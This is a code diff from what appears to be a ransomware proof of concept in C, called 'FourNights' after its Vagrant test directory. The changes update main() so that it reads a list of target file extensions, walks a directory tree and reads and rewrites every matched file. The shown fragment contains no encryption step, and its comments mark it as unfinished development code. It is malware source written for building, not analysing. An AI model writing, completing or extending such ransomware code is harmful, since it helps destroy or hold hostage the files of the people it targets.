@@ -111,10 +111,13 @@ node_t *recurse_ls(char *dirname, ransom_t *ransom)
   * Trap Signals: Disabled for debugging
   * if (signal(SIGINT, SIG_IGN) == SIG_ERR)
   *		puts("signal error\n");
+  * TODO: putting the list of files into a linked list is a massive race condition bug.
+  *       It is acceptable here for development
+  * TODO: need to eliminate hard coded strings.
  **/
 int main(int ac, char *av[])
 {
-	size_t readfile_status = 0;
+	char *buffer;
 	char *default_dir = "/home/vagrant/FourNights/TESTS/";
 	char *file_exts = "/home/vagrant/FourNights/c_poc/file_exts.txt";
 	node_t *walk;
@@ -134,7 +137,7 @@ int main(int ac, char *av[])
 	if (uname(&sys_info) == -1)
 		perror("uname error:");
 	ransom.os_info = sys_info;
-	if((readfile_status = read_file(file_exts, &ransom, tokenizer)) < 1)
+	if(!(buffer = read_file(file_exts, &ransom, tokenizer)))
 		perror("read error: ");
 	ransom.target_files = NULL;
 	recurse_ls(ransom.root_path, &ransom);
@@ -145,17 +148,19 @@ int main(int ac, char *av[])
 	while(walk)
 	{
 		printf("--------%s--------\n", walk->str);
-		read_file(walk->str, &ransom, NULL);
-		write_file(walk, "lala");
+		buffer = read_file(walk->str, &ransom, NULL);
+		if(buffer)
+		{
+printf("%d\n", (int) my_strlen(buffer));
+			write_file(walk, buffer);
+		}
 		walk = walk->next;
-		getchar();
+		free(buffer);
 	}
 	/* print struct for debugging*/
 	/*
 	print_for_debug(ransom);
 	*/
-
-
 	/* Free */
 	free_ransom_struct(&ransom);
 	return (EXIT_SUCCESS);
